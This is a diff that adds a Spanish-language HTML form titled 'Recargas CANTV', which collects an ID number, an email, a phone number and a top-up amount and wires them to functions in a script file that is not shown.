@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recargas CANTV</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="popup">
+        <h1>RECARGAS CANTV</h1>
+        <img src="https://seeklogo.com/images/C/CANTV_2007-logo-C314D6023D-seeklogo.com.png" alt="Logo CANTV">
+        <p>Ingrese su cédula:</p>
+        <input type="text" id="cedula" placeholder="Cédula de identidad" oninput="guardarDatos()">
+        <p>Ingrese su correo electrónico:</p>
+        <input type="email" id="correo" placeholder="Correo electrónico" oninput="guardarDatos()">
+        <p>Ingrese el número de teléfono a recargar:</p>
+        <input type="text" id="telefono" placeholder="Número de teléfono" oninput="validarTelefono()">
+        <p>Ingrese el monto en Bolívares:</p>
+        <input type="number" id="monto" min="5" step="0.01" placeholder="Monto en Bs" oninput="actualizarRecarga()">
+        <div class="result" id="resultado"></div>
+        <button id="procesarButton" onclick="procesarRecarga()" style="display:none;">Procesar Recarga</button>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
